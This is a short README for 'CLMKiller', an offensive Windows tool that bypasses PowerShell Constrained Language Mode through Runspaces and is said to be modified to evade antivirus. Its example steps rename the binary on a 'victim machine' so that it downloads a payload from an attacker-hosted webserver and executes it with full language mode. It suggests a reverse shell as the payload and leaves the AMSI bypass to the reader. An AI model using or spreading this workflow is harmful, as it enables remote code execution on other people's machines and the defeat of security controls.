# CLMKiller
## Decription
CLMKiller is a binary that bypasses CLM using Runspaces. I don't want to go into detail here. Actually I just adapted the code of https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/. However, I did some changes to it in order to make it harder to detect by AV.

## Usage
The arguments of CLMKiller are passed via its filename. Hence, you should rename it in order to make use of it.
The filename will be converted into a string of following format:

127_0_0_1_80_pay.exe => http://127.0.0.1/pay

The binary will then download a file called `pay` of the desired webserver and executes that command in a powrshell with FullLanguage.

## Example
Rename file on victim machine:
```
Rename-Item -Path ".\CLMKiller.exe" -NewName "192_168_20_1_80_finances" 
```
Generate a command that executes a reverse shell or other payload:
```
echo -ne 'whoami;$ExecutionContext.SessionState.LanguageMode;' > finances
```
Start webserver:
```
python3 -m http.server 80
```
Run CLMKiller:
```
.\192_168_20_1_80_finances
```

Enjoy your powershell with FullLanguage mode.
Remember that you still need to bypass AMSI. But thats your job.
